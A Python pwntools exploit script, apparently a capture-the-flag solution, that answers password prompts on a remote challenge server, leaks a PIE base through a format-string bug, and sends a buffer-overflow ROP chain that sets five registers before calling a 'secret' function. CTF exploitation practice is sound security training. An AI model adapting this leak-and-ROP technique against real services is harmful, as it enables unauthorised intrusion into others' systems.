#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

# Connect
io = remote('ctf-chall.stembascc.com', 6055)

# Answer passwords
for pwd in [b'password', b'incorrect', b'again', b'again later']:
    io.sendlineafter(b': ', pwd)

# Leak PIE base
io.sendlineafter(b': ', b'%19$p')
leak = int(io.recvline().split(b'like this? ')[1], 16)
base = leak - 0x1531

log.success(f"Base: {hex(base)}")

# Calculate addresses
addrs = {
    'pop_rdi': base + 0x11e9,
    'pop_rsi': base + 0x11eb,
    'pop_rdx': base + 0x11ed,
    'pop_rcx': base + 0x11ef,
    'pop_r8':  base + 0x11f1,
    'ret':     base + 0x11ea,
    'secret':  base + 0x11f7
}

# Build ROP
io.recvuntil(b': ')
rop = b'A' * 72 + p64(addrs['ret'])

params = [
    (addrs['pop_rdi'], 0xDEADBEEFDEADBEEF),
    (addrs['pop_rsi'], 0xC0DEBABEC0DEBABE),
    (addrs['pop_rdx'], 0x4141414141414141),
    (addrs['pop_rcx'], 0x4242424242424242),
    (addrs['pop_r8'],  0x4343434343434343)
]

for gadget, value in params:
    rop += p64(gadget) + p64(value)

rop += p64(addrs['secret'])

# Exploit
io.sendline(rop)
print(io.recvall(timeout=2).decode())
